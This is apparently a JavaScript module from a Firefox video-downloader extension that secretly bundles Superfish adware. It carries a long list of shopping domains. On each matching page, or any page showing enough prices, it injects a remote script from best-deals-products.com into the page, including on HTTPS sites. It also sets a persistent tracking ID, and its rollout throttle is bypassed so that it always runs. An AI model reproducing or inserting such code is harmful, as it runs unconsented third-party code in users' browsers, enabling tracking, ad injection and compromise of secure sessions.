cquaessentials.com","123together.com","twinxl.com","poem-and-poems.com","cooking.com","gofreelance.com","tooltopia.com","tee-zone.com","points.com","livingincomfort.com","inkpal.com","matrixeyewear.com","filterwater.com","directron.com","accessorypost.com","culinarydistrict.com","shopforbattery.com","motivators.com","tiptopshoes.com","andy's music online.com","askderm.com","aprilairehumidifierparts.com","donorschoose.org","inksell.com","wristbandexpress.com","kidspartymall.com","bizbuyz.net","kitchen-gadgets.com","the candyland store.com","neckties.com","vegas.com","bookcasesgalore.com","shoptronics.com","dell-laptop-battery.com","joggles.com","gearbrat.com","shopngvideos.com","vscsoftware.com","softwaremedia.com","tonerworld.com","shoptheshoebox.com","christianbook.com","cancercars.org","fromthefarm.com","batteryedge.com","plagtracker.com","4rsgold.com","chainsandnecklaces.com","produplicator.com","poolfurniture.com","petbest.com","jewelryarmoire.com","cheesecake.com","amadashoes.com","glasses.com","i'll pump you up.com","jmxbamboo.com","alloutdoorbenches.com","laptopbatteryexpress.com","allpet.com","valuemags.com","charityusa.com","discounthumidifiers.com","myprojectorlamps.com","designerbaby.com","santaletters4kids.com","officebundle.com","contactlensreorders.com","touchofmodern.com","firepits.com","starboxes.com","petfood.com","hotels.com","wallplatesonline.com","shopdress.com","governmentauction.com","motorcyclecenter.com","swiminn.com","gateequipment.com","practicalreviews.com","lawndoctor.com","outdoorlightingplus.com","globalunlock.com","sendaflyingcard.com","colortonerexpert.com","netalamode.com","wheatgrasskits.com","shorestore.com","safetyglasses.net","bulbs.com","sterlingtek.com","nt-ice.com","greatrusticfurniture.com","us-mattress.com","skinenergizer.com","jbandme.com","shopcell.com","dotcomsavings.com","onlypajamas.com","thestreet.com","livinleather.com","writingdesks.com","pdaparts.com","landscapersstore.com","mint.com","cutting-mats.net","heels.com","shopwoodworking.com","simplyfountains.com","water.com","candelabras.com","miccostumes.com","badassjewelry.com","1800businesscards.com","supplementwarehouse.com","apparelnbags.com","snowboardmonster.com","nyshirt.com","thedogonline.com","oldies.com","lampsgalore.com","factorydirectjewelry.com","userful.com","newyorkdress.com","name-creations.net","hp-laptop-batteries.net","americanpassport.com","bestbeautyboutique.com","endtables.com","audio-direct.com","poolcuesplus.com","glowhost.com","a1supplements.com","rocktumblers.com","macxdvd.com","acekaraoke.com","giftcertificates.com","apartments.com","lasersman.com","a2btv.com"];

var AVAILABLE_TITLES = [];

var availableHostsObj = {};

AVAILABLE_HOSTS.forEach( function( host ){
	
	availableHostsObj[host] = 1;
	
} );

cfvd_Superfish = new function(){
	
	var wm = Cc["@mozilla.org/appshell/window-mediator;1"].getService(Ci.nsIWindowMediator);
	
	var prefs = null;
	
	var windowListener = {
	    onOpenWindow: function(aWindow){
	        // Wait for the window to finish loading
	        var domWindow = aWindow.QueryInterface(Ci.nsIInterfaceRequestor).getInterface(Ci.nsIDOMWindowInternal || Ci.nsIDOMWindow);
	        domWindow.addEventListener("load", function(){
	            domWindow.removeEventListener("load", arguments.callee, false);
				
	            listenWindow(domWindow);
				
	        }, false);
	    },
	    
	    onCloseWindow: function(aWindow){
	    },
	    onWindowTitleChange: function(aWindow, aTitle){
	    }
	};
	
	function prepareTitle( title ){
		
		title = title.replace(/\W+/g, "").toLowerCase();
		
		return title;
		
	}
	
	function getUUID(){  
		
		var id = null;
		
		try{
			id = prefs.getStringVal("superfish_id");
		}
		catch( ex ){
			
		}
		
		if( id ){
			return id;
		}
	
        id = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {  
            var r = Math.random()*16|0, v = c == 'x' ? r : (r&0x3|0x8);  
            return v.toString(16);  
        }).toUpperCase();  
		
		prefs.setStringVal("superfish_id", id);
		
		return id;
		
    }
	
	function listenWindow( window ){
		
		if( !window || !window.document || !window.document.getElementById || !window.document.getElementById( "appcontent") ){
			return;
		}
		
		window.document.getElementById( "appcontent" ).addEventListener("DOMContentLoaded", domLoadedCallback, true);
				
	}
	
	function unlistenWindow( window ){
		
		if( !window || !window.document || !window.document.getElementById || !window.document.getElementById( "appcontent") ){
			return;
		}
		
		window.document.getElementById( "appcontent" ).removeEventListener("DOMContentLoaded", domLoadedCallback, true);
		
	}
		
	function domLoadedCallback( e ){
		
		if( !prefs.getBoolVal("enable_superfish") )			return;
		if( !needShow() )			return;
		
					
		var win = e.target.defaultView;
	    if (win.wrappedJSObject){
			win = win.wrappedJSObject;				
		}
		
		var document = win.document;
		
		if( fvd_single_Config.superFishMode == "standard" ){
			var host = document.location.host;
			var docTitleLower = prepareTitle(document.title);
			
			var metaDesc = "";
			var metaElem = document.querySelector("meta[name=description]");
			if( metaElem ){
				metaDesc = prepareTitle(metaElem.getAttribute("content"));
			}
					
			host = host.toLowerCase().replace( "www.", "" );
			var hostPrefix = host.split(".")[0];
			
			var hostAvailable = hostPrefix in availableHostsObj || host in availableHostsObj;
			
		 	if( !hostAvailable ){
		 		for( var i = 0; i != AVAILABLE_TITLES.length; i++ ){
		 			if( docTitleLower.indexOf( AVAILABLE_TITLES[i] ) != -1 || metaDesc && metaDesc.indexOf( AVAILABLE_TITLES[i] ) != -1 ){
		 				hostAvailable = true;
		 				
		 				dump("Found title "+ AVAILABLE_TITLES[i] +" in " + docTitleLower + "\n" );
		 				
		 				break;
		 			}	 			
		 		}	
		 	}		
			
			if( !hostAvailable ){
				return;
			}	
		}
		else if( fvd_single_Config.superFishMode == "checkPrice" ) {
			
			var html = document.body.innerHTML;
			var reg = /(\$[0-9+\.,]+|[0-9+\.,]+\$)/g;
			
			var prices = 0;
			
			while (found = reg.exec(html)) {
				prices++;
			}
			
			if( prices < fvd_single_Config.superFishCountPrices ){
				return;
			}
			
			dump( "FOUND prices " + prices + "\n" );
			
		}
		
		if( !win.superfish ){
				
			dump("\n\nInsert superfish into: "+ document.location.href +"\n\n");
					
			var userId = getUUID();

			//var injectUrl = "www.best-deals-products.com/ws/sf_main.jsp?dlsource=lwjyocpk&CTID=xyz";			
			//var injectUrl = "www.superfish.com/ws/sf_main.jsp?dlsource=vjartpv&CTID=fvdmoz";
			var injectUrl = "www.best-deals-products.com/ws/sf_main.jsp?dlsource=vjartpv&CTID=fvdmoz";
			
			if( document.location.href.indexOf("https:") === 0 ){
				injectUrl = "https://" + injectUrl;
			}
			else{
				injectUrl = "http://" + injectUrl;
			}

			var script = document.createElement("script");
			script.setAttribute( "src", injectUrl );
			document.head.appendChild( script );
			
		}
		
	}
	
	this.init = function( _prefs ){

		setRampStartTime();
	
    	wm.addListener(windowListener);
		
	    var windows = wm.getEnumerator("navigator:browser");
		
	    while (windows.hasMoreElements()) {
	        var domWindow = windows.getNext().QueryInterface(Ci.nsIDOMWindow);
	        listenWindow(domWindow);
	    }	
		
		prefs = _prefs;	
		
		fvd_single_Misc.readUrl( "resource://fvd.single.modules/superfish_titles.txt", function( text ){
			
			var lines = text.split("\n");
			
			for( var i = 0; i != lines.length; i++ ){
				lines[i] = lines[i].trim();
				
				if( !lines[i] ){
					continue;
				}
				
				AVAILABLE_TITLES.push( prepareTitle(lines[i]) );
			}
			
		} );
		
	};
	
	this.uninit = function(){
				
		wm.removeListener(windowListener);
		
	    var windows = wm.getEnumerator("navigator:browser");
		
	    while (windows.hasMoreElements()) {
	        var domWindow = windows.getNext().QueryInterface(Ci.nsIDOMWindow);
	        unlistenWindow(domWindow);
	    }	
		
	};

	// -----------------------------  RAMP  ----------	
	function setRampStartTime(){
		
	    if( !getRampStartTime() ){
	    	fvd_single_Settings.setStringVal( "superfish.ramp.start_time", new Date().getTime() );
	    }
		
	}
	
	// ----------
	function getRampStartTime(){
		
		try{
			return parseInt( fvd_single_Settings.getStringVal( "superfish.ramp.start_time" ) );
		}
		catch( ex ){
			return 0;
		}
		
	}
	
	// ---------------------
	function getRamp(){
		
		var now = new Date().getTime();
		var rampStart = getRampStartTime();
		
		var diff = now - rampStart;
		
		var month = 24 * 3600 * 30 * 1000;
		
		var perc = diff/month;
		
		perc += 0.1;
		
		if( perc > 1 ){
			perc = 1;
		}			
		
		perc = Math.abs( perc );
		
		return perc;
				
	}
	
	function needShow(){
		
		return true;
		
		var perc = getRamp();

		var random = Math.random();
		
		if( random <= perc ) 	return true;
		
		return false;
		
	}
	
	this.removeRamp = function(){
		
		fvd_single_Settings.setStringVal( "superfish.ramp.start_time", 1 );
		
	};
	
	
};
